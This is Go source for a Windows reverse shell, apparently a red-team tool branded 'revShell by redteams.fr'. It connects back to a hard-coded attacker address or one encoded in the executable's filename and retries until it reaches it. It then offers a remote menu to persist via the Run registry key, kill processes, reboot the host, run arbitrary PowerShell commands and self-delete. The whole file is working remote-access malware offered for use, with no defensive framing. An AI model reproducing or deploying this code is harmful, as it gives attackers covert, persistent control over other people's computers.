package main

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"time"
	"os/user"
	"github.com/sqweek/dialog"
	"github.com/shirou/gopsutil/process"
	"golang.org/x/sys/windows/registry"
)

const (
	defaultServerAddress = "192.168.50.129:4444"
	retryInterval        = 2 * time.Second
	defaultWaitTime      = 0 * time.Second
)

func reverseShell(serverAddress string, waitTime time.Duration) {
	time.Sleep(waitTime)

	for {
		conn, err := net.Dial("tcp", serverAddress)
		if err != nil {
			fmt.Println("Failed to connect to server. Retrying...")
			time.Sleep(retryInterval)
			continue
		}

		fmt.Println("Connected to server at address:", serverAddress)

		scanner := bufio.NewScanner(conn)

		for {
			menu := `
revShell by redteams.fr
1: Create an empty file on the desktop
2: Show a MessageBox
3: Persist in Run registry key
4: List processes with PIDs
5: Kill process (requires PID)
6: Rickroll
7: Self delete and Exit
8: Reboot
9: GetUID
10: Execute PowerShell command
`

			conn.Write([]byte(menu))

			if !scanner.Scan() {
				fmt.Println("Connection lost. Retrying...")
				conn.Close()
				break
			}

			command := strings.TrimSpace(scanner.Text())

			switch command {
			case "1":
				usr, _ := user.Current()
				path := filepath.Join(usr.HomeDir, "Desktop", "emptyfile.txt")
				ioutil.WriteFile(path, []byte{}, 0644)
			case "2":
				dialog.Message("%s", "coucou").Title("MessageBox").Info()
			case "3":
				k, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.QUERY_VALUE|registry.SET_VALUE)
				if err != nil {
					conn.Write([]byte(fmt.Sprintf("Failed to open registry key: %v\n", err)))
				}
				if err := k.SetStringValue("MyApp", os.Args[0]); err != nil {
					conn.Write([]byte(fmt.Sprintf("Failed to set registry value: %v\n", err)))
				}
				k.Close()
			case "4":
				processes, _ := process.Processes()
				for _, p := range processes {
					pid := p.Pid
					name, _ := p.Name()
					conn.Write([]byte(fmt.Sprintf("%d: %s\n", pid, name)))
				}
			case "5":
				conn.Write([]byte("Enter PID to kill: "))
				pidBuffer, _ := bufio.NewReader(conn).ReadString('\n')
				pidStr := strings.TrimSpace(pidBuffer)
				pid, _ := strconv.Atoi(pidStr)
				p, _ := process.NewProcess(int32(pid))
				p.Kill()
			case "6":
				cmd := exec.Command("cmd", "/c", "start", "msedge", "-kiosk", "https://attacks.redteams.fr/rickroll")
				err := cmd.Start()
				if err != nil {
					conn.Write([]byte(fmt.Sprintf("Failed to start command: %v\n", err)))
				}
			case "7":
				cmd := exec.Command("cmd", "/C", "timeout", "/T", "5", "/nobreak", "&", "del", os.Args[0])
				err := cmd.Start()
				if err != nil {
					conn.Write([]byte(fmt.Sprintf("Failed to start delete command: %v\n", err)))
				}
				os.Exit(0)
			case "8":
				cmd := exec.Command("shutdown", "/r", "/t", "0")
				err := cmd.Run()
				if err != nil {
					conn.Write([]byte(fmt.Sprintf("Failed to reboot: %v\n", err)))
				}
			case "9":
				cmd := exec.Command("whoami")
				output, err := cmd.Output()
				if err != nil {
					conn.Write([]byte(fmt.Sprintf("Failed to execute whoami: %v\n", err)))
				} else {
					conn.Write([]byte(fmt.Sprintf("Current user: %s\n", output)))
				}
			case "10":
				conn.Write([]byte("Enter PowerShell command to execute: "))
				psCommandBuffer, _ := bufio.NewReader(conn).ReadString('\n')
				psCommand := strings.TrimSpace(psCommandBuffer)

				cmd := exec.Command("powershell", "-command", psCommand)
				output, err := cmd.Output()
				if err != nil {
					conn.Write([]byte(fmt.Sprintf("Failed to execute PowerShell command: %v\n", err)))
				} else {
					conn.Write([]byte(fmt.Sprintf("Output: %s\n", output)))
				}

			default:
				conn.Write([]byte("Invalid option\n"))
			}
		}
	}
}

func parseFilename() (string, time.Duration, error) {
	filename := filepath.Base(os.Args[0])
	filename = strings.TrimSuffix(filename, ".exe")

	split := strings.Split(filename, "-")
	if len(split) < 2 || len(split) > 4 {
		return "", defaultWaitTime, nil
	}

	ip := split[0]
	port, err := strconv.Atoi(split[1])
	if err != nil {
		return "", defaultWaitTime, nil
	}

	waitTime := defaultWaitTime
	if len(split) >= 3 {
		seconds, err := strconv.Atoi(split[2])
		if err != nil {
			return "", defaultWaitTime, nil
		}
		waitTime = time.Duration(seconds) * time.Second
	}

	if len(split) == 4 {
		wd, _ := os.Getwd()
		if !strings.Contains(wd, split[3]) {
			os.Exit(0)
		}
	}

	return fmt.Sprintf("%s:%d", ip, port), waitTime, nil
}

func main() {
	serverAddress, waitTime, _ := parseFilename()
	if serverAddress == "" {
		serverAddress = defaultServerAddress
		waitTime = defaultWaitTime
	}
	fmt.Println("Connecting to server at address:", serverAddress)

	reverseShell(serverAddress, waitTime)
}
